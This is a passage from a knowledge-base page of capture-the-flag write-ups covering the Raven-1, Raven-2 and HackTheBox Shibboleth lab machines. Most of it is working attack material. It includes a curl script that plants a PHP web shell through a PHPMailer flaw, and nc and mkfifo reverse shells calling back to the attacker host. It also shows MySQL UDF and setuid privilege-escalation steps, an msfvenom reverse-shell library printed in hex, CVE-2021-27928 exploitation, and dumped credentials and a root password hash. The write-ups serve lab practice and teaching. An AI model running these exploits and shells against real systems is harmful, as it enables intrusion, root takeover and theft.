|  4 |           1 | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3{afc01ab56b50591e7dccf93122770cd2}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | flag3        |              | draft       | open           | open        |               |               |         |        | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 |                       |           0 | http://raven.local/wordpress/?p=4                                |          0 | post      |                |             0 |
|  5 |           1 | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 | flag4{715dea6c055b9fe3337544932f2941ce}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | flag4        |              | inherit     | closed         | closed      |               | 4-revision-v1 |         |        | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 |                       |           4 | http://raven.local/wordpress/index.php/2018/08/12/4-revision-v1/ |          0 | revision  |                |             0 |
|  7 |           2 | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 | flag3{afc01ab56b50591e7dccf93122770cd2}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | flag3        |              | inherit     | closed         | closed      |               | 4-revision-v1 |         |        | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 |                       |           4 | http://raven.local/wordpress/index.php/2018/08/13/4-revision-v1/ |          0 | revision  |                |             0 |
+----+-------------+---------------------+---------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------+-------------+----------------+-------------+---------------+---------------+---------+--------+---------------------+---------------------+-----------------------+-------------+------------------------------------------------------------------+------------+-----------+----------------+---------------+
5 rows in set (0.00 sec)
```

最后一个flag,flag3终于找到

``` bash
flag3{afc01ab56b50591e7dccf93122770cd2}
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub216.jpg)

#### 使用msf进行getshell的方法

``` bash
msf5 exploit(multi/http/phpmailer_arg_injection) > show options

Module options (exploit/multi/http/phpmailer_arg_injection):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.168.56.118   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /contact.php     yes       Path to the application root
   TRIGGERURI  /                no        Path to the uploaded payload
   VHOST                        no        HTTP server virtual host
   WEB_ROOT    /var/www/html    yes       Path to the web root


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHPMailer <5.2.18


msf5 exploit(multi/http/phpmailer_arg_injection) > exploit

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] Writing the backdoor to /var/www/html/XTXxkX1w.php
[*] Sleeping before requesting the payload from: /XTXxkX1w.php
[*] Waiting for up to 300 seconds to trigger the payload
[*] Sending stage (38288 bytes) to 192.168.56.118
[*] Meterpreter session 2 opened (192.168.56.102:4444 -> 192.168.56.118:34607) at 2020-02-14 08:02:30 -0500
[+] Deleted /var/www/html/XTXxkX1w.php
[+] Successfully triggered the payload

meterpreter > sysinfo
Computer    : Raven
OS          : Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64
Meterpreter : php/linux
meterpreter > shell
Process 17423 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
ls
Security - Doc
about.html
contact.php
contact.zip
css
elements.html
fonts
img
index.html
js
scss
service.html
team.html
vendor
wordpress
```

#### 知识点总结

 - phpmailer漏洞getshell
 - wordpress用户名泄露
 - mysql udf提权
 - python suid提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end Raven-1 -->

</details>

<a id="case-raven-2"></a>

## PHPMailer 参数与 UDF 动态库

上传入口之后，原链编译并加载 UDF 动态库；插件目录、setuid 程序和数据库版本分别限制后续步骤。

<p class="kb-provenance">来源 Raven-2 · 原记录 2020-03-26 · 23 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-raven-2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Raven-2 -->

#### 名称
名称：Raven: 2
发布日期：2018年11月9日

#### 下载

 - Download: https://drive.google.com/open?id=1fXp4JS8ANOeClnK63LwgKXl56BqFJ23z
 - Download (Mirror): https://download.vulnhub.com/raven/Raven2.ova
 - Download (Torrent): https://download.vulnhub.com/raven/Raven2.ova.torrent



#### 描述

Raven 2是中等级别的boot2root VM。有四个要获取的flag。多次攻击破坏之后，Raven Security采取了额外的措施来加固Web服务器，以防止黑客入侵。您是否仍然可以crush Raven？

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.119
Host is up (0.00022s latency).
MAC Address: 08:00:27:A4:D6:91 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -sV -v -p- 192.168.56.119
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
58132/tcp open  status  1 (RPC #100024)
```

``` bash
root@kali:~# nmap -A -v -p 22,80,111,58132 192.168.56.119 --script=vuln -T4
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.119
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.119:80/
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.119:80/service.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.119:80/contact.php
|     Form id: myform
|     Form action: 
|     
|     Path: http://192.168.56.119:80/contact.php
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.119:80/index.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.119:80/wordpress/
|     Form id: search-form-5e7c8d72d17d7
|_    Form action: http://raven.local/wordpress/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /manual/: Potentially interesting folder
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_http-server-header: Apache/2.4.10 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
111/tcp   open  rpcbind 2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35360/udp6  status
|   100024  1          35599/tcp6  status
|   100024  1          46931/udp   status
|_  100024  1          58132/tcp   status
58132/tcp open  status  1 (RPC #100024)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

上nikto

``` bash
root@kali:~# nikto -C all -h 192.168.56.119
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Uncommon header 'link' found, with contents: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
```

网站使用wordpress搭建的，现在把raven.local添加到kali的/etc/hosts文件中和windows的hosts文件中。。。
用dirbuster扫描网站，使用medium字典，看看能得到什么。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub217.jpg)

#### Flag1

/vendor目录下有一个PATH文件，里面是第一个flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub218.jpg)

``` bash
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
```

#### PHPMailer<5.2.18-远程命令执行

看起来该站点还使用PHPMailer 5.2.16。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub219.jpg)

5.2.18之前的PHPMailer版本易于执行远程命令

为此编写一个bash脚本，使用curl作为漏洞利用的主要驱动程序。

exploit.sh
``` bash
TARGET=http://raven.local/contact.php

DOCROOT=/var/www/html
FILENAME=backdoor.php
LOCATION=$DOCROOT/$FILENAME

STATUS=$(curl -s \
              --data-urlencode "name=Hackerman" \
              --data-urlencode "email=\"hackerman\\\" -oQ/tmp -X$LOCATION blah\"@badguy.com" \
              --data-urlencode "message=<?php echo shell_exec(\$_GET['cmd']); ?>" \
              --data-urlencode "action=submit" \
              $TARGET | sed -r '146!d')

if grep 'instantiate' &>/dev/null <<<"$STATUS"; then
  echo "[+] Check ${LOCATION}?cmd=[shell command, e.g. id]"
else
  echo "[!] Exploit failed"
fi
```

执行脚本

``` bash
root@kali:~/vulnhub/raven2# ./exploit.sh 
[+] Check /var/www/html/backdoor.php?cmd=[shell command, e.g. id]
```

之后成功运行命令如下图所示

``` bash
view-source:http://raven.local/backdoor.php?cmd=whoami
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub220.jpg)

#### 低权限的shell

使用nc的-e选项反弹一个低权限的shell

``` bash
view-source:http://raven.local/backdoor.php?cmd=nc%20192.168.56.102%205566%20-e%20/bin/bash
```

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
connect to [192.168.56.102] from raven.local [192.168.56.119] 44985
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Raven:/var/www/html$ id                                              
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Raven:/var/www/html$ whoami
whoami
www-data
```

现在获取了一个低权限的shell


#### Flag 2

第二个flag位于www-data的home目录中。

``` bash
ww-data@Raven:/var/www$ ls
ls
flag2.txt  html
www-data@Raven:/var/www$ cat flag2.txt
cat flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}
```

#### Flag 3

使用find命令寻找flag3

``` bash
www-data@Raven:/var/www$ find / -type f -name 'flag[3-4].*' 2>/dev/null
find / -type f -name 'flag[3-4].*' 2>/dev/null
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
```

浏览器访问

``` bash
http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub221.jpg)

到此得到第3个flag

#### 提权

在对www-data的帐户进行枚举时，注意到MySQL以root身份运行。但是由于此版本的MySQL是5.5，所以不能使用流行的EDB-ID 1518用户定义函数或UDF。

``` bash
root       921  0.0 10.1 552000 51240 ?        Sl   01:02   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```

``` bash
www-data@Raven:/var/www$ dpkg -l | grep mysql
dpkg -l | grep mysql
ii  libdbd-mysql-perl              4.028-2+deb8u2                     amd64        Perl5 database interface to the MySQL database
ii  libmysqlclient18:amd64         5.5.60-0+deb8u1                    amd64        MySQL database client library
ii  mysql-client-5.5               5.5.60-0+deb8u1                    amd64        MySQL database client binaries
ii  mysql-common                   5.5.60-0+deb8u1                    all          MySQL database common files, e.g. /etc/mysql/my.cnf
ii  mysql-server                   5.5.60-0+deb8u1                    all          MySQL database server (metapackage depending on the latest version)
ii  mysql-server-5.5               5.5.60-0+deb8u1                    amd64        MySQL database server binaries and system database setup
ii  mysql-server-core-5.5          5.5.60-0+deb8u1                    amd64        MySQL database server binaries
ii  php5-mysqlnd                   5.6.36+dfsg-0+deb8u1               amd64        MySQL module for php5 (Native Driver)
ii  php5-mysqlnd-ms                1.6.0-1+b1                         amd64        MySQL replication and load balancing module for PHP
```

从wp-config.php文件中得到mysql的账号密码登录

``` bash
www-data@Raven:/var/www/html$ grep -A3 -B3 root wordpress/wp-config.php
grep -A3 -B3 root wordpress/wp-config.php
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');
```

 - 【提权方法1】：

有一个GitHub仓库[UDF-Repository-for-MySQL](https://github.com/mysqludf)，其中托管着许多5.5兼容的UDF，可以使用它们来完成提权。选择[lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)，这是一个具有与操作系统交互功能的UDF库。


 - 【提权方法2】：

MySQL利用远程root代码执行提权

更多信息参考[MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662](https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)

因此，搜索UDF动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518.c”。

[exploit-1518](https://www.exploit-db.com/exploits/1518)

该漏洞利用是通过将原始C代码编译为“.so”文件，然后将其传输到受害计算机并利用MySQL漏洞来运行的。
第一步是对其进行编译。

``` bash
root@kali:~/vulnhub/raven2/priviligesc# searchsploit 1518
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)           | exploits/linux/local/1518.c
root@kali:~/vulnhub/raven2/priviligesc# locate 1518.c
/root/vulnhub/raven1/1518.c
/usr/share/exploitdb/exploits/linux/local/1518.c
root@kali:~/vulnhub/raven2/priviligesc# cp /usr/share/exploitdb/exploits/linux/local/1518.c .
root@kali:~/vulnhub/raven2/priviligesc# ls
1518.c
root@kali:~/vulnhub/raven2/priviligesc# gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
root@kali:~/vulnhub/raven2/priviligesc# ls
1518.c  1518.so
```

将该“.so”文件传输到受害者计算机的/tmp目录下。

``` bash
root@kali:~/vulnhub/raven2/priviligesc# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.56.1 - - [26/Mar/2020 03:52:25] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [26/Mar/2020 03:52:33] "GET /1518.so HTTP/1.1" 200 -
192.168.56.119 - - [26/Mar/2020 03:52:50] "GET /1518.so HTTP/1.1" 200 -
```

``` bash
www-data@Raven:/tmp$ wget http://192.168.56.102/1518.so
wget http://192.168.56.102/1518.so
converted 'http://192.168.56.102/1518.so' (ANSI_X3.4-1968) -> 'http://192.168.56.102/1518.so' (UTF-8)
--2020-03-27 02:52:49--  http://192.168.56.102/1518.so
Connecting to 192.168.56.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19104 (19K) [application/octet-stream]
Saving to: '1518.so'

1518.so             100%[=====================>]  18.66K  --.-KB/s   in 0s     

2020-03-27 02:52:49 (554 MB/s) - '1518.so' saved [19104/19104]

www-data@Raven:/tmp$ chmod 777 *
chmod 777 *
```

 - 使用命令行登录mysql，利用漏洞和mysql命令行及so文件进行提权,如下所示

``` bash
www-data@Raven:/tmp$ mysql -uroot -p'R@v3nSecurity'
mysql -uroot -p'R@v3nSecurity'
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/find');create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/tmp/1518.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
Query OK, 1 row affected (0.10 sec)

mysql> create function do_system returns integer soname '1518.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('chmod u+s /usr/bin/find');
<mod u+s /usr/bin/find');select do_system('chmod u+s /usr/bin/find');        
+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)

+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
```

 - 开始提权并读取最后的flag4

``` bash
www-data@Raven:/tmp$ touch lucifer11
www-data@Raven:/tmp$ find lucifer11 -exec "whoami" \;
find lucifer11 -exec "whoami" \;
root
www-data@Raven:/tmp$ find lucifer11 -exec "id" \;
find lucifer11 -exec "id" \;
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
www-data@Raven:/tmp$ find lucifer11 -exec "/bin/sh" \;
find lucifer11 -exec "/bin/sh" \;
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
# pwd
pwd
/tmp
# cd /root
cd /root
# ls
ls
flag4.txt
# cat flag4.txt
cat flag4.txt
  ___                   ___ ___ 
 | _ \__ ___ _____ _ _ |_ _|_ _|
 |   / _` \ V / -_) ' \ | | | | 
 |_|_\__,_|\_/\___|_||_|___|___|
                           
flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting RavenII

I hope you enjoyed this second interation of the Raven VM

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```

完成提权并且成功的读取到了flag4

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub222.jpg)


 - 【提权方法3】：

还是利用Mysql udf提权，只不过这次用到setuid.c

setuid.c

``` bash
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
	setuid(0); setgid(0); system("/bin/bash");
}
```

下面是整个mysql语句的操作命令，步骤可以参照【提权方式2】

``` bash
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so'; 
select * from mysql.func;
select do_system('gcc -o /tmp/setuid /tmp/setuid.c');
select do_system('chmod u+s /tmp/setuid');
\! sh .
/setuid
```

命令执行完成之后即拥有了root权限的shell


#### 知识点总结

 - PHPMailer<5.2.18-远程命令执行
 - mysql5.5版本udf提权（1518.c）
 - setuid.c脚本提权


<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end Raven-2 -->

</details>

<a id="case-shibboleth"></a>

## 管理平台与 MariaDB 加载路径

原链从 Zabbix 账户进入命令执行，再利用 MariaDB 配置的动态库加载行为提权。数据库身份、插件文件和执行结果保留。

<p class="kb-provenance">来源 shibboleth · 原记录 2021-11-14 · 10 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-shibboleth">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start shibboleth -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	13 Nov 2021
IP:	10.10.11.124

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2098.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### NMAP

``` bash
┌──(root💀kali)-[~/hackthebox/machine/shibboleth]
└─# nmap -sV -v -p- --min-rate=10000 10.10.11.124
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
```

just find an open 80 port...

#### wfuzz fuzz subdomains

finded the following 3 subdomains

``` bash
monitor.shibboleth.htb
monitoring.shibboleth.htb
zabbix.shibboleth.htb
```

let's add these subdomains to our /etc/hosts file

``` bash
10.10.11.124       shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb
```

#### information gathering

then goto:

``` bash
http://zabbix.shibboleth.htb/index.php
```

target is using Zabbix, that's interesting...

let's brute the username and password with msf module auxiliary/scanner/http/zabbix_login

or:

got the hash with scanner/ipmi/ipmi_dumphashes

and then cracked it with hashcat. Take note of the password because you will need it later.

Credentials for zabbix Administrator:ilovepumkinpie1

#### initial shell and got user

Go to Config -> Hosts -> Items -> Create an Item : Name the item whatever, put your key as system.run[bash rev shell &,nowait], then time as 1m.,click the "test" button. Send the payload and wait for 1 min.

``` bash
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 7400 >/tmp/f &,nowait]
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2099.jpg)

and we got a initial shell

check the /etc/passwd file found that ipmi-svc user are interesting...

``` bash
┌──(root💀kali)-[~/hackthebox/machine/shibboleth]
└─# nc -lvp 7400
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7400
Ncat: Listening on 0.0.0.0:7400
Ncat: Connection from 10.10.11.124.
Ncat: Connection from 10.10.11.124:52976.
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
zabbix@shibboleth:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin
Debian-snmp:x:111:119::/var/lib/snmp:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
```

To get user and use the same password:

``` bash
zabbix@shibboleth:/$ su - ipmi-svc
su - ipmi-svc
Password: ilovepumkinpie1

ipmi-svc@shibboleth:~$ id
id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
ipmi-svc@shibboleth:~$ whoami
whoami
ipmi-svc
ipmi-svc@shibboleth:~$ cd ~
cd ~
ipmi-svc@shibboleth:~$ cat user.txt
cat user.txt
1d4770a14467f4a395f0441d620a6807
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2100.jpg)

#### get root access

after run some privesc scripts, we find that CVE-2021-27928 maybe helpful To get root

 - [CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)

Easy root just the following steps.

1. msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4455 -f elf-so -o CVE-2021-27928.so
2. nc -lnvp 4455
3. python3 -m http.server 80
4. cd /tmp and then wget http://10.10.14.12/CVE-2021-27928.so
5. run python3 -c 'print(open("CVE-2021-27928.so", "rb").read().hex())' check the output (this step is not necessary......just take a look)

``` bash
┌──(root💀kali)-[~/hackthebox/machine/shibboleth]
└─# python3 -c 'print(open("CVE-2021-27928.so", "rb").read().hex())'
7f454c4602010100000000000000000003003e000100000092010000000000004000000000000000b000000000000000000000004000380002004000020001000100000007000000000000000000000000000000000000000000000000000000dc0100000000000026020000000000000010000000000000020000000700000030010000000000003001000000000000300100000000000060000000000000006000000000000000001000000000000001000000060000000000000000000000300100000000000030010000000000006000000000000000000000000000000008000000000000000700000000000000000000000300000000000000000000009001000000000000900100000000000002000000000000000000000000000000000000000000000000000000000000000c00000000000000920100000000000005000000000000009001000000000000060000000000000090010000000000000a0000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000000006a2958996a025f6a015e0f05489748b9020011670a0a0e0c514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05
```

6. mysql -uzabbix -pbloooarskybluh -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'

Don't worry about getting "ERROR 2013 (HY000): Lost connection to MySQL server during query" error

``` bash
ipmi-svc@shibboleth:/tmp$ mysql -uzabbix -pbloooarskybluh -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'
<ET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
```

we will receive a connection back as root immediately.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/shibboleth]
└─# nc -lvp 4455
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4455
Ncat: Listening on 0.0.0.0:4455
Ncat: Connection from 10.10.11.124.
Ncat: Connection from 10.10.11.124:41428.
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@shibboleth:/var/lib/mysql# whoami
whoami
root
root@shibboleth:/var/lib/mysql# id
id
uid=0(root) gid=0(root) groups=0(root)
root@shibboleth:/var/lib/mysql# cd ~
cd ~
root@shibboleth:/root# cat root.txt
cat root.txt
d0d2d3d47038f6e4ed147edbbc3d5a7c
root@shibboleth:/root# cat /etc/shadow | grep root
cat /etc/shadow | grep root
root:$6$HeRqkRJL9pttp4EY$TBE4vztPy9lOaywPhVdhQHwiPa09s7RJw418EMjmS0RKea/1QBwLqTHK84ato5yDBF59dMvSNbQQ1pVy.K1dp.:18741:0:99999:7:::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2101.jpg)

#### Summary of knowledge

 - Zabbix brute & hash crack with hashcat
 - Zabbix getshell
 - su - to get user privesc
 - CVE-2021-27928 to get root privesc

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end shibboleth -->

</details>

